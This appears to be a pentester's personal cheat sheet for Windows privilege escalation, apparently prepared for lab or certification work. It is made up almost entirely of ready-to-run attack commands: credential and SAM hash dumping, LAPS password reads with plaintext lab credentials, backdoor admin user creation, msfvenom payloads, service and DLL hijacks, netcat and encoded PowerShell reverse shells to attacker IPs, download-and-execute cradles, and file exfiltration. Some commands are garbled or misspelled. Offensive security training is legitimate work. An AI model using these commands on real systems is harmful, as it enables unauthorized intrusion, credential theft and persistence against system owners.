shutdown /r /t 0

#	WinPrevEsc

-   PowerUp.ps1		[https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc]
	-	Invoke-AllChecks
	-	
##  System Enumeration
-   hostname
-   systeminfo | findstr /B /C:"OS Name" /C:"OS Version" C:/"System Type" 
-   sysinfo
-   Get-ComputerInfo -Property "*version"
-   wmic os get osarchitecture
-	wmic qfe get Cpation,Description,HotFixID,InstalledOn
-	wmic logicaldisk get caption,description,providername

##	User Enumeration

>	User Enumeration
-   whoami
-   whoami /priv
-   whoami /all
-   whoami /groups
-   net user
-   net user <username>
>	Groups Enumeration [If unusual group is available for you, must check]	
-   net localgroup
-   net localgroup <groupname>

>	USer Enumeration on Domain
-   net user /domain
-   net user <username> /domain

>	Group Enumeration on domain
-   net group /domain 
-   net group <groupname> /domain

##  Add / Change Users / Groups

-   net user <Username> <Password> /add     :   add user
-   net users <Username> <Password> /add     :   add user
-   net localgroup <GroupName> <Username> /add
-   net localgroup administrators hacker /add
-   net user <Username> <Password> 			:	Change the password of the user	

-   net user <Username> <Password> /add /domain
-   net localgroup <GroupName> <Username> /add /domain
-   net user <Username> <Password> /domain
-   net group "Domain Admins" hacker /add /domain
```
Remote Desktop Users
```
##	Network Information

-   ipconfig
-   ipconfig /all
-	arp -a
-	route print
-	netstat -ano
-   netstat -anop tcp
-   netstat -anop udp

##	Password Mining
-	Win Logon creds
-	Registry password 
-	SAM system backup, [REPAIR/BACKUP]
-	DPAPI Creds
-	Passwords of saved wifi
-	saved RDP Connections
-	Recent run commands / Powershell history
-	Remote Desktop Credentials Manager passwords?
-	Grep commands for finding password
-	findstr /si password *.txt *.ini *.config *.xml
-	Find all those strings in config files.
	-	dir /s *pass* == *cred* == *vnc* == *.config*
- Find all passwords in all files.
	-	findstr /spin "password" *.*
	-	findstr /spin "password" *.*
```
These are common files to find them in. They might be base64-encoded. So look out for that.
-------------------------------------------------------------------------------------------
In Files
-------------
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

In Registry
------------------
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
---------------------------------------------------
SAM and SYSTEM files
------------------------
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
------------------------------------------------------------
Generate a hash file for John using `pwdump` or `samdump2`.

pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt

===================================================================================================
Check PayloadAllTheThings for more:
===================================================================================================
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords
```

##	AV Enumeration	`[Check The Firewall Status]`

-	sc query windefend
-	sc queryex type= service
-	netsh advfirewall firewall dump
-	netsh firewall show state
-	netsh firewall show config

##	Running Process
-   ps
-   tasklist

##	Directory Enumeration

>	Program Files / Program Files x86 / Users home dir [Check recurse dir /s /a ] / inetpub / 	[Installed Apps]
>	Schedule task / `.bat` [dir /s /a *.bat] from C directory

>	link [sysmlink] file [ippsec]-[]

##		AlwaysInstallElevated [SharpUp.ps1,PowerUp.ps1-`Write-UserAddMSI`]
```
$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

$ Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
$ Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer

$ msfvenom -p windows/adduser USER=backdoor PASS=Backdoor@123 -f msi -o evil.msi
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
$ msfvenom -p windows/adduser CMD="powershell encoded payload" -f msi -o evil.msi

-	msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.60.124 LPORT=80 -f msi -o reverse.msi

msfvenom -p windows/exec CMD='net group "Domain Admins" yogi810 /add' -f dll > userenv.dll

msiexec /quiet /qn /i C:\evil.msi

```

##	LAPS ENabled : For Password mining

```
##	LAPS	[Don't forget to place the domain&ip to the host file]

└─# ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://$IP "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

-------------------------------------------------------------

└─# crackmapexec ldap $IP -d hutch.offsec -u fmcsorley -p 'CrabSharkJellyfish192' -M laps --kdcHost hutch.offsec


>   Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Objee $null } | Select-Object 'Name','ms-Mcs-AdmPwd'
```

##	If we can `Modify Any Service` [change-bin-path] [don't run nc.exe] 

-	[change-bin-path]
-	accesschk64.exe -uwcv Everyone *
-	Check PowerUp [check service permissions]
-	can restart the service? YES
-	accesschk64.exe -wuvc daclsvc
-	RW Everyone - SERVICE CHANGE CONFIG
-	sc qc daclsvc
-	sc config daclsvc binpath= "net localgroup administrators user /add"
-   sc start daclsvc
-------------------------------------------------------------------------------------

>	service start / stop
>	service is running as LocalSystem
>	AutoStart
>	ShutDown Prev

```
>	icalcs
-   icacls C:\BINARY_PATH_LOCATION  [CHECK the read write permission if we have]
-   icacls WService.exe /grant Everyone:F
-   icacls C:\MyPrograms\Disk.exe /grant Everyone:F
-   icacls root.txt /grant alfred:F

>	sc.exe
-   sc stop windowsscheduler
-   sc start windowsscheduler
-   sc qc apphostsvc    [details about the service]
-   sc query                      ==              all available services
-   sc query type= service
-   sc query Tlntsvr                  ==              particular service info and status
-   sc qc Tlntsvr                  ==              full particular service detail
-   sc stop Tlntsvr                  ==              stop service
-   sc start Tlntsvr                  ==              start
-   sc pause Tlntsvr
-   sc continue tlntsvr.exe
-   sc create <service> binpath= "C:\Users\user\Desktop\shell.exe"
-   sc config daclsvc binpath= "C:\Users\user\Desktop\shell.exe"
-   sc.exe config UsoSvc binPath= 'C:\programdata\nc64.exe -e cmd.exe 10.10.20.20 443'
-   `sc` config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
-   sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
-   sc config <Service_Name> binpath= "net localgroup administrators username /add"
-   sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
-   sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"

>   accesscheck
-   C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

>   net
-   net start servicename
-   net stop servicename

>   Get-Acl C:\MyPrograms\Disk.exe | fl
>   Get-Acl C:\MyPrograms\ | fl
```

##	Unquoated service path  [PowerUp.ps1]	`[[*] Checking for unquoted service paths]`

>	wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"

-	FIND a service with spaces in the names
-	put your malicious exe in any of the place of the service path
-	sc start <serviceName>
-	icacls "C:\Puppet"
>	service start / stop
>	service is running as LocalSystem
>	AutoStart / Or if we able to make it AutoStart
>	ShutDown Prev


##		DLL Hijacking
```
## Dll hijacking



//Download ╬╝Torrent (uTorrent) 2.0.3 - DLL Hijacking 




---https://www.exploit-db.com/exploits/14748




Download and install the utorrent




>> Now Download "Process monitor" and analyize the binary or exe file dll file by filtering



---remember that Process monitor always runs as admin to show all the files and processes.


---Now Search for dll file whos path== NAME NOT FOUND, In other words the dll file is missing and if the location have write permission then it become vulnerable to dll hijacking


--- These file location must have write permission according to the version of the exe, In order to exploit them



## How to exploit DLL hiijacking 



1. Firstly, Check the Dll file with the executable file if it does exist then




2. Focus on the dll file whos PATH says are NAME NOT FOUND. It means the file does not exist 




3. Now if the file exists in the program files x86 and does have write permission in the location of the dll file then we can exploit the vulnerability by placing our malicious file with the same name on the location.




4. Generating the payload via msfvenom



    > msfvenom -p windows/exec CMD='net group "Domain Admins" yogi810 /add' -f dll > userenv.dll




5. Finally Placng the file to the location of the binary and restart the pc will make the service restart and our dll file will be executed along with the binary and runs our command.




//Admin USER achieved.
```




##	Startup Apps / Registry Startup
```
## Startup apps



>> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"


--- Go to the above location and check if any apps are running at startup, If there is then check the application permission 




>> C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"


---Users can write on the file


--- modify the file and and get the reverse shell or make user admin
```

##  Run commands as different users

-	runas /netonly /user:ZA\t1_leonard.summers cmd.exe

-   runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"

``` run command as different user
$secpasswd = ConvertTo-SecureString "password321" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("john", $secpasswd)
$computer = "GHOST"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","192.168.0.114 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

>   cmdkey /list
-   runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"
-   runas /savecred /user:admin cmd.exe
-   c:\windows\system32\runas.exe /user:ACCESS\Administrator  /savecred "C:\windows\system32\cmd.exe /c TYPE c:\users\administrator\desktop\root.txt > c:\users\security\root.txt"

[+]	cmdkey /list
	[-]	net user username	[to check if password is required for the user]
	[-]	runas /savecred /noprofile /user:ACCESS\USERNAME met.exe	[running commands behalf on the user]
	[-]	runas /env /profile /user:ACCESS\USERNAME met.exe



[+]	C:\Users\viewer>runas /env /profile /user:Administrator "C:\Users\viewer\nc.exe -e cmd.exe 192.168.49.54 80"          
Enter the password for Administrator:

[+]	Need RDP access

c:\Users\ted\Desktop>powershell.exe Start-Process "cmd.exe" -Verb runAs





##	Check Patch History


##  UAC bypass
>   fodhelper
	-	
>   sigcheck.exe


##  Antivirus Evasion
>   Shelter

##	Kernal Exploit
-   Windows Exploit Suggester

┌──(root㉿kali)-[/PDATA/offsec-prep/Windows-PrevEsc-Tools/Windows-Exploit-Suggester]
└─# python3 windows-exploit-suggester.py  --database 2022-11-26-mssb.xls --systeminfo systeminfo.txt

- 	Windows Exploit Suggester - Next Generation [https://github.com/bitsadmin/wesng]
┌──(root㉿kali)-[/PDATA/offsec-prep/Windows-PrevEsc-Tools/wesng]
└─# python wes.py /home/kali/data/machines/htb/windows/chatterbox/systeminfo.txt
```
##  Windows Exploit Suggester

    -   https://github.com/AonCyberLabs/Windows-Exploit-Suggester

    -   python2.7 windows-exploit-suggester.py --update

    -   python2.7 windows-exploit-suggester.py --database 2022-09-26-mssb.xls --systeminfo /home/kali/data/machines/htb/windows/chatterbox/systeminfo.txt

    -   pip2.7 install xlrd==1.2.0
```

##	Tools

>	Kernal Exploit Suggest
	-	Sherlock-> Watson, windows-exploit-suggester.py

###	Executables
-   WinPeas.exe		[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS]
-	Seatbelt.exe	[https://github.com/GhostPack/Seatbelt]	
-	SharpUp.exe		[https://github.com/GhostPack/SharpUp]
-	Watson.exe		[https://github.com/rasta-mouse/Watson]

###	PowerShell 
-	Sherlock.ps1	[https://github.com/rasta-mouse/Sherlock]
	Find-AllVulns
-   PowerUp.ps1		[https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc]
	-	Invoke-AllChecks
-	SharpUp.ps1
	-	SharpUp audit
-   PowerView.ps1	[Domain-Enumeration]

-   Windows-Prevs-Checker [Pentester-Monkey]
-   JAWS			[https://github.com/411Hall/JAWS]


-   Seatbelt	[Like-WinPEAS]
	-	Seatbelt -group=all
	-	Seatbelt WindowsAutoLogon

	GetnNetLoggedOnUser
	GetDomainUser
	GetNetLocalGroup
	GetDomainComputers
##	Other
-	windows-exploit-suggester.py	[https://github.com/AonCyberLabs/Windows-Exploit-Suggester]
-	exploit-suggester (metasploit)

###	Port Forwarding Tools
>   psexec.exe
>   Chisel.exe
>   PLINK.exe

##	Download & Uploading 

[+]	Downloading

-	scp target_username@$IP:/home/abc.txt .

-	certutil.exe -urlcache -split -f "http://192.168.49.68/evil.exe" "C:\Backup\evil.exe"
-	certutil.exe -urlcache -f "http://192.168.49.68/evil.exe" evil.exe

-	powershell -c wget http://10.10.14.21/PowerView.ps1 -OutFile PowerView.ps1
-   powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
-   powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\wget.exe')"

-	powershell -c Invoke-WebRequest -URI http://10.17.64.5/winPEASx64.exe -OutFile winPEASx64.exe
-	powershell.exe iwr -uri 192.168.49.91/nc64.exe -o C:\Users\Public\cc.exe

-   Invoke-WebRequest "http://10.10.14.21/PowerView.ps1" -OutFile PowerView.ps1

-	[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPU=="))

-	powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.15.110/nc64.exe -outfile nc64.exe

-	powershell.exe -Command "Invoke-WebRequest \"http://10.17.64.5:8082/Invoke-PowerShellTcp.ps1\" -OutFile Invoke-PowerShellTcp.ps1"
-	powershell -Command "Invoke-WebRequest \"http://10.17.64.5:8082/Invoke-PowerShellTcp.ps1\" -OutFile Invoke-PowerShellTcp.ps1"
-	powershell.exe "IEX(New-Object Net.WebClient).downloadString(\"http://10.17.64.5:8082/Invoke-PowerShellTcp.ps1\")"
-	powershell "IEX(New-Object Net.WebClient).downloadString(\"http://10.17.64.5:8082/Invoke-PowerShellTcp.ps1\")"

[+]	Executing W/Without downloading

-   powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
-   IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
-   IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1'); get-netcomputer
-	powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.15.110 443"
-	C:\Users\Public\cc.exe -e cmd.exe 192.168.49.91 443


[+]	Uploading

-   C:\Users\Offsec> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')

-	[Convert]::ToBase64String((Get-Content -path "C:\Users\divine\AppData\Roaming\FileZilla\filezilla.xml" -Encoding byte))

-	kali `[sudo imapacket-smbserver -smb2support share -username offsec -password offsec]`
-	windows `[copy somethig.zip \\$KALI-IP\share\]`
--------------------------------------------------------------------------
-	kali `python -m pyftplib -p 21 --write`
-	windows `ftp 10.10.10.15 ; anonymous:anonymous; put abc.zip`
##	Reverse Shell 

[+]	World Writable Directories

-	C:\Windows\system32\spool\drivers\color\
-	

###	`Invoke-PowerShellTcp.ps1`	[/opt/webshell/nishang/Shells/Invoke-PowerShellTcp.ps1]
-	[Edit it and add the below line at last]
-   `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.32 -Port 1234`
-   Start the python server and server Invoke-PowerShellTcp.ps1
-	IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/Invoke-PowerShellTcp.ps1')

###	Powershell base64 payload	[https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58]

-	cd /PDATA/offsec-prep/Windows-PrevEsc-Tools

-	└─# python powershell_b64shell.py 192.168.119.195 80

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQA5ADUAIgAsADgAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUw
... 
```
-	execute it directly from powershell and get the shell

=================================================================
[!] BUt not showing as `nt/authority system`

>   psexec.exe -i -s cmd.exe    [OR-you-can-run-nc.exe-with-psexec]

>   We are `nt/authority system`


##	Having creds

>	impacket scripts

-	impacket-psexec svcorp.com/nina:ThisIsTheUsersPassword14@10.11.1.22